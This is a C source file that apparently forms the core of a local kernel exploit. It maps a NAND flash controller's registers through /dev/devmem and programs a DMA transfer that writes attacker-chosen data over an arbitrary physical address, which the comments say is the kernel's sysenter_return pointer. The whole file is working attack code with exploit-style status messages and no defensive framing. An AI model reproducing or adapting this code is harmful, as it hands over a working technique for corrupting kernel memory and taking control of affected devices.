#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <signal.h>
#include <stdint.h>
#include <unistd.h>
#include <syscall.h>

#include "nand.h"

/* Ok, so this is really a writel() call, but on x86 it's the same thing
 * as a simple assignment. */
static inline void nfc_writel(unsigned int val, unsigned int *addr)
{
	*addr = val;
}

static inline unsigned int nfc_readl(unsigned int *addr)
{
	return *addr;
}

static inline void nfc_writel_flush(unsigned int val, void *addr)
{
	nfc_writel(val, addr);
	(void)nfc_readl(addr);
}

static inline void nfc_write_indirect(struct nfc_mem_regs *pm,
				      unsigned int addr, unsigned int val)
{
	nfc_writel(addr, &pm->cmd);
	nfc_writel(val, &pm->io);
}

int clobber(unsigned long addr, unsigned int pageno)
{

	int fd, mode, i;
	void *page;
	struct nfc_mem_regs *mem_regs;
	struct nfc_regs *regs;

	fd = open("/dev/devmem", O_RDWR | O_SYNC);

	if (fd < 0) {
		printf("[-] Failed to open device file.\n");
		return -1;
	}

	page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
			fd, NAND_MEM_REGS);

	if (page == MAP_FAILED) {
		printf("[-] Failed to map NAND controller device memory: %s\n", strerror(errno));
		return -1;
	}
	mem_regs = (struct nfc_mem_regs *)page;

	page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
			fd, NAND_REGS);

	if (page == MAP_FAILED) {
		printf("[-] Failed to map NAND controller device memory: %s\n", strerror(errno));
		return 1;
	}

	regs = (struct nfc_regs *)page;

	printf("[+] Initiating DMA...\n");

	nfc_writel_flush(1, &regs->dma_en);

	mode = CMD_MODE_10 | (0 << 24);
	nfc_write_indirect(mem_regs, mode | pageno, 0x2000 | 1);
	nfc_write_indirect(mem_regs, mode | ((unsigned short)(addr >> 16) << 8), 0x2200);
	nfc_write_indirect(mem_regs, mode | ((unsigned short)addr << 8), 0x2300);
	nfc_write_indirect(mem_regs, mode | 0x14000, 0x2400);

	/* Clear the interrupt */
	nfc_writel_flush(IRQ_STS_DMA_DONE, &regs->irq[0].sts);
	nfc_writel_flush(0, &regs->dma_en);

	/* We really should unmap these registers and close the fd,
	 * but we've clobbered the sysenter_return pointer, so if
	 * we invoke any system calls via glibc we'll segfault. It's
	 * not that important. */
//	munmap((void *)mem_regs, 4096);
//	munmap((void *)regs, 4096);
//	close(fd);

	return 0;

}
